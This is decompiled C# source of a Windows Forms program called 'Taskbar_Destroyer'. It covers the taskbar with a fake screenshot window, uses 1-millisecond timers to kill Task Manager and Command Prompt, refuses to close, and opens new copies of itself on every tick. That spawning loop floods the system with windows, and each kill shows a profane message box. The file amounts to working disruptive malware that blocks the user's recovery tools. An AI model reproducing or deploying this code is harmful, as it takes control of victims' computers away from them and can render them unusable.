using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Taskbar_Destroyer.My;

namespace Taskbar_Destroyer;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("SmallTaskbar")]
	internal virtual Timer SmallTaskbar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer KillProcesses
	{
		[CompilerGenerated]
		get
		{
			return _KillProcesses;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = KillProcesses_Tick;
			Timer killProcesses = _KillProcesses;
			if (killProcesses != null)
			{
				killProcesses.remove_Tick(eventHandler);
			}
			_KillProcesses = value;
			killProcesses = _KillProcesses;
			if (killProcesses != null)
			{
				killProcesses.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Spread
	{
		[CompilerGenerated]
		get
		{
			return _Spread;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Spread_Tick;
			Timer spread = _Spread;
			if (spread != null)
			{
				spread.remove_Tick(eventHandler);
			}
			_Spread = value;
			spread = _Spread;
			if (spread != null)
			{
				spread.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Closing((CancelEventHandler)Form1_Closing);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Invalid comparison between Unknown and I4
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		if (MySettingsProperty.Settings.AskIfTaskbarSmall)
		{
			if ((int)Interaction.MsgBox((object)"Do you have a small taskbar?", (MsgBoxStyle)4132, (object)"Small Taskbar") == 6)
			{
				MySettingsProperty.Settings.SmallTaskbar = true;
				MySettingsProperty.Settings.AskIfTaskbarSmall = false;
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
			}
			else
			{
				MySettingsProperty.Settings.SmallTaskbar = false;
				MySettingsProperty.Settings.AskIfTaskbarSmall = false;
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
			}
		}
		if (MySettingsProperty.Settings.SmallTaskbar)
		{
			SmallTaskbar.set_Interval(2);
		}
		checked
		{
			if (SmallTaskbar.get_Interval() == 2)
			{
				Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 30);
				Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 30);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(new Point(0, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height - 30), new Point(0, 0), size);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((Control)this).set_BackgroundImage((Image)(object)val);
			}
			else
			{
				Size size2 = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 40);
				Bitmap val3 = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 40);
				Graphics val4 = Graphics.FromImage((Image)(object)val3);
				try
				{
					val4.CopyFromScreen(new Point(0, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height - 40), new Point(0, 0), size2);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				((Control)this).set_BackgroundImage((Image)(object)val3);
			}
			int x = (int)Conversion.Int((float)Screen.get_PrimaryScreen().get_Bounds().Width * VBMath.Rnd() + 1f);
			_ = (int)Conversion.Int((float)Screen.get_PrimaryScreen().get_Bounds().Height * VBMath.Rnd() + 1f);
			if (SmallTaskbar.get_Interval() == 2)
			{
				((Form)this).set_Location(new Point(x, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height - 30));
			}
			else
			{
				((Form)this).set_Location(new Point(x, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height - 40));
			}
			if (SmallTaskbar.get_Interval() == 2)
			{
				((Form)this).set_Size((Size)new Point(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 30));
			}
			else
			{
				((Form)this).set_Size((Size)new Point(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, 40));
			}
			KillProcesses.Start();
			Spread.Start();
		}
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		e.Cancel = true;
		Interaction.MsgBox((object)"You're not closing this.", (MsgBoxStyle)16, (object)"Fuck you!");
	}

	private void KillProcesses_Tick(object sender, EventArgs e)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		foreach (Process process in processesByName)
		{
			try
			{
				process.Kill();
				Interaction.MsgBox((object)"You're not opening task manager.", (MsgBoxStyle)16, (object)"Fuck you!");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		Process[] processesByName2 = Process.GetProcessesByName("cmd");
		foreach (Process process2 in processesByName2)
		{
			try
			{
				process2.Kill();
				Interaction.MsgBox((object)"You're not opening command prompt.", (MsgBoxStyle)16, (object)"Fuck you!");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Spread_Tick(object sender, EventArgs e)
	{
		((Control)new Form1()).Show();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		components = new Container();
		SmallTaskbar = new Timer(components);
		KillProcesses = new Timer(components);
		Spread = new Timer(components);
		((Control)this).SuspendLayout();
		SmallTaskbar.set_Interval(1);
		KillProcesses.set_Interval(1);
		Spread.set_Interval(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1024, 40));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
	}
}
